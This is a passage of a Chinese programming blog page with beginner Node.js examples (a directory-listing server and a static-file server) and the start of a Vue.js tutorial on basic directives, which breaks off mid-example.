<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.url == <span class="string">"/favicon.ico"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个变量，用来存放目录</span></span><br><span class="line">    <span class="keyword">var</span> dirs = []</span><br><span class="line">    <span class="comment">// 读取./ablum下的所有文件,包括文件和文件夹</span></span><br><span class="line">    fs.readdir(<span class="string">"./ablum"</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err,files</span>) </span>&#123; </span><br><span class="line">        <span class="comment">//定义一个递归函数</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">iterator</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 一旦下标到达数组长度,则返回</span></span><br><span class="line">            <span class="keyword">if</span>(i == files.length)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(dirs);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> path = <span class="string">"./ablum/"</span>+files[i];</span><br><span class="line">            <span class="comment">// 判断是否为文件夹,如果是,则加入dirs</span></span><br><span class="line">            fs.stat(path,<span class="function"><span class="keyword">function</span> (<span class="params">err,stats</span>) </span>&#123; </span><br><span class="line">                <span class="keyword">if</span>(stats.isDirectory())&#123;</span><br><span class="line">                    dirs.push(path);</span><br><span class="line">                &#125;</span><br><span class="line">                iterator(i+<span class="number">1</span>);</span><br><span class="line">             &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 强制当前下标迭代完再迭代下一个下标</span></span><br><span class="line">        iterator(<span class="number">0</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(<span class="string">"Success"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>



<h1 id="静态目录"><a href="#静态目录" class="headerlink" title="静态目录"></a>静态目录</h1><ol>
<li>通过路径访问文件</li>
<li>浏览器的Content-type能读取文件正确的格式以便渲染</li>
<li>事先在同级目录下准备static文件，用于存放html、css、jpg等静态资源</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">	<span class="comment">//得到用户的路径</span></span><br><span class="line">	<span class="keyword">var</span> pathname = url.parse(req.url).pathname;</span><br><span class="line">	<span class="comment">//默认首页</span></span><br><span class="line">	<span class="keyword">if</span>(pathname == <span class="string">"/"</span>)&#123;</span><br><span class="line">		pathname = <span class="string">"index.html"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拓展名</span></span><br><span class="line">	<span class="keyword">var</span> extname = path.extname(pathname);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//真的读取这个文件</span></span><br><span class="line">	fs.readFile(<span class="string">"./static/"</span> + pathname,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(err)&#123;</span><br><span class="line">			<span class="comment">//如果此文件不存在，就应该用404返回</span></span><br><span class="line">			fs.readFile(<span class="string">"./static/404.html"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">				res.writeHead(<span class="number">404</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line">				res.end(data);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">//MIME类型，就是</span></span><br><span class="line">		<span class="comment">//网页文件：  text/html</span></span><br><span class="line">		<span class="comment">//jpg文件 :   image/jpg</span></span><br><span class="line">		<span class="keyword">var</span> mime = getMime(extname);</span><br><span class="line">		res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:mime&#125;);</span><br><span class="line">		res.end(data);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">3000</span>,<span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMime</span>(<span class="params">extname</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(extname)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">".html"</span> :</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"text/html"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">".jpg"</span> : </span><br><span class="line">			<span class="keyword">return</span> <span class="string">"image/jpg"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">".css"</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"text/css"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


            
            <p class="more">
                <a href="../../http:/ymlog.cn/2020/04/29/NodeJS_1/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2020/04/29/NodeJS_1/" title="NodeJS（一） 静态路由">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/9.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2020/04/26/VueJS/">
    		VueJS 浅知
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2020-04-26T05:43:51.000Z">2020-04-26</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>Vue 是Javascript的框架，用于简化DOM（domain obeject m）操作，响应式数据驱动。</p>
<p>Vue两种导入方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="初试Vue"><a href="#初试Vue" class="headerlink" title="初试Vue"></a>初试Vue</h1><p>1、 Hello World</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vue基础&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">        &#123;&#123; message &#125;&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el:&quot;#app&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            message:&quot; Hello Vue !&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<p>2、介绍</p>
<ul>
<li>el是用来设置Vue实例挂载的元素</li>
<li>Vue会管理el选项命中的元素机器内部的后代</li>
<li>可以使用其他选择器，但是建议使用ID选择器</li>
<li>可以使用其他的双标签，不能使用HTML和Body标签</li>
</ul>
<p>3、data：数据对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el:&quot;#app&quot;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        message:&quot; Hello Vue !&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>





<p>4、字符、字典、数组的表示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    字符：&#123;&#123; message &#125;&#125; &lt;br&gt;</span><br><span class="line">    字典：&#123;&#123; contact.phone &#125;&#125; &lt;br&gt;</span><br><span class="line">    数组：&#123;&#123; hobby[0] &#125;&#125; &lt;br&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el:&quot;#app&quot;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        message:&quot; Hello Vue !&quot;,</span><br><span class="line">        contact:&#123;</span><br><span class="line">            phone:&quot;18151908744&quot;,</span><br><span class="line">            email:&quot;2212585023@qq.com&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">        hobby:[&quot;Reading&quot;,&quot;Sleeping&quot;,&quot;JS&quot;,&quot;Watching&quot;],</span><br><span class="line">   &#125;,</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>





<h1 id="Vue指令"><a href="#Vue指令" class="headerlink" title="Vue指令"></a>Vue指令</h1><p>vue指令指的是以v-开头的一组特殊语法</p>
<ul>
<li><p>内容绑定，事件绑定</p>
<blockquote>
<p> v-text</p>
<p>v-html</p>
<p>v-on</p>
</blockquote>
</li>
<li><p>显示切换，属性绑定</p>
<blockquote>
<p>v-show</p>
<p>v-if</p>
<p>v-bind</p>
</blockquote>
</li>
<li><p>列表循环，表单元素绑定</p>
<blockquote>
<p>v-for</p>
<p>v-on补充</p>
<p>v-model</p>
</blockquote>
</li>
</ul>
<h2 id="内容绑定"><a href="#内容绑定" class="headerlink" title="内容绑定"></a>内容绑定</h2><h3 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h3><p>设置标签的文本值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 v-text&#x3D;&quot;message&quot;&gt;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el:&quot;#app&quot;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        message:&quot;Hello Vue!&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><p>设置html标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;!-- 如果是普通文本，这里的显示结果和v-text没有任何不同</span><br><span class="line">    如果是HTML文本，则会渲染 --&gt;</span><br><span class="line">    &lt;div v-html&#x3D;&quot;message&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">   el:&quot;#app&quot;,</span><br><span class="line">   data:&#123;</span><br><span class="line">   message:&quot;&lt;a href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;&gt;Hello Vue!&lt;&#x2F;a&gt;&quot;,</span><br><span class="line">   &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ol>
<li>v-html指令的作用是：设置元素的innerHTML</li>
<li>内容中有HTML结构会被解析为标签</li>
<li>v-text指令无论内容是什么，只会解析成文本</li>
</ol>
<h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><ol>
<li>为元素绑定事件</li>
<li>事件名不需要写on</li>
<li>指令可以简写为@</li>
<li>绑定的方法定义在methods属性中</li>
</ol>
<p>基本结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   &lt;div&gt;</span><br><span class="line">       &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;事件绑定&quot; v-on:事件名&#x3D;&quot;方法&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var app &#x3D; new Vue(&#123;</span><br><span class="line">           el:&quot;#app&quot;,</span><br><span class="line">           methods:&#123;</span><br><span class="line">               方法名:function()&#123;</span><br><span class="line">                   &#x2F;&#x2F;逻辑</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; </span><br><span class="line">       &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>v-on 可以直接替换为 @ </p>
<p>事件名有以下几种类型</p>
<ul>
<li>点击事件 click</li>
<li>鼠标移入 monseenter (这两个好像不太行)</li>
<li>双击dbclick</li>
</ul>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;事件绑定&quot; v-on:click&#x3D;&quot;doit&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el:&quot;#app&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        doit:function()&#123;</span><br><span class="line">            alert(&quot;GGGGo!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>Vue中不考虑更改DOM元素，只需要更改数据，数据更改之后，DOM元素会同步更新。</p>
<p>this关键字，拿到定义的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 type&#x3D;&quot;text&quot; v-text&#x3D;&quot;food&quot; @click&#x3D;changeFood&gt; &lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el:&quot;#app&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            food:&quot;抹茶味冰淇淋&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            changeFood:function()&#123;</span><br><span class="line">                &#x2F;&#x2F; console.log(this.food);</span><br><span class="line">                this.food +&#x3D;&quot;卖完了！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>



<h2 id="1、计数器"><a href="#1、计数器" class="headerlink" title="1、计数器"></a>1、计数器</h2><ul>
<li><p>创建Vue示例时：el（挂载点）；data（数据），methods（方法）</p>
</li>
<li><p>v-on指令的作用就是绑定事件，简写为@</p>
</li>
<li><p>方法中通过this关键字获取data中的数据</p>
</li>
<li><p>v-text指令的作用是：设置元素的文本值，简写为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#125;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;-&quot; @click&#x3D;sub&gt;</span><br><span class="line">        &lt;span&gt;&#123;&#123; Nbr &#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;+&quot; @click&#x3D;add&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el:&quot;#app&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            Nbr:1,</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            add:function()&#123;</span><br><span class="line">                this.Nbr+&#x3D;1;</span><br><span class="line">            &#125;,</span><br><span class="line">            sub:function()&#123;</span><br><span class="line">                this.Nbr-&#x3D;1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>



<img src="https://i.loli.net/2020/04/26/M1s8mWFTKIH9CDB.png" alt="image-20200424220438863" style="zoom:33%;" />



<h2 id="显示切换"><a href="#显示切换" class="headerlink" title="显示切换"></a>显示切换</h2><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><ol>
<li>根据表达式真假，切换元素的显示或隐藏。</li>
<li>原理是修改元素的display属性，实现显示隐藏</li>
<li>指令后面的内容，最后都会解析成布尔值</li>
<li>如果为true显示元素，如果为false则隐藏</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;.&#x2F;img&#x2F;orange.jpg&quot; alt&#x3D;&quot;ORANGEIMG&quot; v-show&#x3D;&quot;isShow&quot; height&#x3D;&quot;400px&quot;&gt;</span><br><span class="line">        &lt;!-- 当年龄大于18岁的时候，图片才会显示 --&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;.&#x2F;img&#x2F;orange.jpg&quot; alt&#x3D;&quot;ORANGEIMG&quot; v-show&#x3D;&quot;age&gt;18&quot; height&#x3D;&quot;400px&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el:&quot;#app&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            isShow:true,</span><br><span class="line">            age:15,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>



<h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><ol>
<li>v-if指令的作用是：根据表达式的真假切换元素的显示状态</li>
<li>本质是通过操纵DOM元素来实现显示状态</li>
<li>表达式的值为true，元素存在于dom树中，为false，从dom树中移除。</li>
<li>频繁的切换v-show，反之使用v-if，前者切换消耗小</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;.&#x2F;img&#x2F;orange.jpg&quot; alt&#x3D;&quot;ORANGEIMG&quot; v-if&#x3D;&quot;age&lt;11&quot; height&#x3D;&quot;400px&quot;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app &#x3D; new Vue(&#123;</span><br><span class="line">        el:&quot;#app&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            isShow:true,</span><br><span class="line">            age:12,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>



<h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><ol>
<li>v-bind指令的作用是：为元素绑定属性</li>
<li>完整写法是：v-bind:属性名</li>
<li>简写的话可以直接省略v-bind，只保留：属性名</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">    1、记得想要操纵的属性前面一定要加冒号，比如:src , :class </span><br><span class="line">    2、functional中想要取变量需要加this</span><br><span class="line">    3、显示隐藏class的语法是:class&#x3D;&#123;className,isActive&#125;</span><br><span class="line">     